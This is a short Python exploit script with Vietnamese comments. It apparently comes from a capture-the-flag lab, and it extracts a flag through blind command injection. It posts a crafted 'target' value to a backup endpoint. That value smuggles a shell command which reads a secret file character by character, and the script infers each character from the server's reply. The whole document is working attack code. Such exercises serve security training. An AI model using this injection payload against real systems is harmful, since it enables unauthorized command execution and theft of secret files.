import requests

#Boolean-based

CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-'
URL = 'http://cmdi.cyberjutsu-lab.tech:3006/index.php'
FLAG = ""
for index in range(1, 25):
    print(f"[DEBUG] Đang bruteforce kí tự thứ {index}")
    for c in CHARSET:
        INJECT = f"a.zip --help; cmd=`cat /*secret.txt | cut -c {index}`; if [ \"$cmd\" = '{c}' ]; then echo 'dung'; else echo 'zip error'; fi; #"
        
        r = requests.post(URL, {'command': 'backup', 'target': INJECT})
        
        # Xóa dòng cũ và in dòng mới
        print(f"\r[DEBUG] Thử kí tự thứ {index}, kí tự '{c}', --> {r.text}", end="", flush=True)
        
        if 'Backup thành công' in r.text:
            FLAG += c
            print(f"\nTìm ra kí tự thứ {index} là '{c}', FLAG hiện tại: {FLAG}           ")
            break
